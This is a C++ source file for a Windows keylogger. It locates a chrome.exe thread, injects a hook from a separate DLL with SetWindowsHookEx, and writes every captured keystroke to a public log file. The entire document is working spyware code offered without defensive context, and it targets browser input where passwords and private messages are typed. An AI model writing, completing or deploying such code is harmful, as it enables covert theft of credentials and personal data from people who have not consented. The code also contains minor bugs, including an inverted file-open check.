// KeyboardHook.cpp
//Must use it on a function that calls User32.dll

#include <stdio.h>
#include <Windows.h>
#include <TlHelp32.h>
#include <psapi.h>

DWORD FindMainProcThread() {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    DWORD tid = 0;
    THREADENTRY32 te32;
    te32.dwSize = sizeof(te32);

    Thread32First(hSnapshot, &te32);
    do {
        auto hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, te32.th32OwnerProcessID);
        if (hProc) {
            WCHAR name[MAX_PATH];
            if (GetProcessImageFileName(hProc, name, MAX_PATH) > 0) {
               auto bs = wcsrchr(name, L'\\');
                if (bs && _wcsicmp(bs, L"\\chrome.exe") == 0) { //Process to log keystrokes from
                    tid = te32.th32ThreadID;
                    break;
                }
            }
            CloseHandle(hProc);
        }
    } while (Thread32Next(hSnapshot, &te32));
    CloseHandle(hSnapshot);
    
    return tid;
}

int main(int argc, char** argv)
{
    DWORD tid = FindMainProcThread();

    //Load the DLL
    auto sharedDll = LoadLibrary(L"SharedDll.dll");
    if (!sharedDll) {
        printf("[-] Unable to locate DLL\n");
        return 1;
    }
    auto hHook = SetWindowsHookEx(WH_GETMESSAGE, (HOOKPROC)GetProcAddress(sharedDll, "HookFunction"), sharedDll, tid);
    auto setComunication = (void (WINAPI*)(DWORD,HHOOK))GetProcAddress(sharedDll, "SetCommunicationThread");
    
    if (!hHook) {
        printf("[-] Unable to receive a handle to the hook procedure\n");
        return 1;
    }

    setComunication(GetCurrentThreadId(), hHook);
    PostThreadMessage(tid, WM_NULL, 0, 0); //Wake the thread up

    //Open or create a new file to store the logs
    FILE* fp;
    if (!fopen_s(&fp, "C:\\Users\\Public\\logs.txt", "a") == 0) { //Path to where the logs are stored
        printf("[-] Unable to get a handle to the log file\n");
        return 1;
    }
    //
    MSG msg;
    while (GetMessage(&msg, nullptr, 0, 0)) {
        if (msg.message == WM_APP) {
            printf("%c", (int)msg.wParam);
            fprintf(fp, "%c", (int)msg.wParam);
            if (msg.wParam == 13) printf("\n");
        }
    }
    fclose(fp);
    UnhookWindowsHookEx(hHook);
    FreeLibrary(sharedDll);

}
